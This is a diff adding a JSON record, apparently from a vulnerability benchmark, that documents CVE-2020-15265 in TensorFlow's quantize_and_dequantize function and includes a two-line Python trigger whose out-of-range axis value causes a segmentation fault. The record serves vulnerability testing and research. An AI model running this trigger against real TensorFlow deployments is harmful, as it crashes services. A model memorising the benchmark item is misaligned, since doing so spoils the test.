@@ -1,0 +1,15 @@
+{
+  "file_id": "473_tensorflow_issue_42105",
+  "numeric_id": "473",
+  "library_hint": "tensorflow",
+  "source": "github_issue",
+  "title": "Segmentation fault in tf.quantization.quantize_and_dequantize when axis is set to a large number",
+  "cve": "CVE-2020-15265",
+  "cwe": "CWE-787: Out-of-bounds Write",
+  "library": "tensorflow",
+  "affected_version": ">= 2.0, < 2.4.0",
+  "vulnerable_function": "tf.quantization.quantize_and_dequantize",
+  "triggerability": "indirect",
+  "trigger_payload": "import tensorflow as tf\ntf.quantization.quantize_and_dequantize(input=[2.5, 2.5], input_min=[0,0], input_max=[1,1], axis=1000)",
+  "oracle": "Segmentation fault (core dumped)"
+}
